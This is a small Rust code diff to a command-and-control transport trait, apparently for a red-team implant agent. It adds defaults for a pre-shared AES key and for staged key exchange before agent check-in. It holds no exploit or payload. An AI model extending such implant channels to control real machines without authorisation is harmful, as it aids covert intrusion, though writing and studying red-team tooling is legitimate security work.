@@ -60,11 +60,21 @@ pub trait C2Transport {
     /// Error type for transport failures (timeout, DNS resolution, etc.).
     type Error;
 
-    /// The encryption mode this transport was built with.  Defaults to
-    /// [`CryptoMode::None`] (plaintext).  Override to declare support for
-    /// static keys or staging.
-    fn crypto_mode(&self) -> CryptoMode {
-        CryptoMode::None
+    /// The pre-shared AES key for this transport, if any.
+    ///
+    /// Return the base64-encoded key for static-key and RSA-staging payloads
+    /// (the initial AESPSK).  Return `None` for plaintext.
+    fn aes_psk(&self) -> Option<String> {
+        None
+    }
+
+    /// Whether this transport requires an encrypted key exchange (staging)
+    /// before the agent can check in.  Defaults to `false`.
+    ///
+    /// Return `true` for RSA-staging or translation-staging payloads;
+    /// `false` for plaintext and static-key payloads.
+    fn encrypted_exchange_check(&self) -> bool {
+        false
     }
 
     /// Deliver a `checkin` message and return the raw server response.
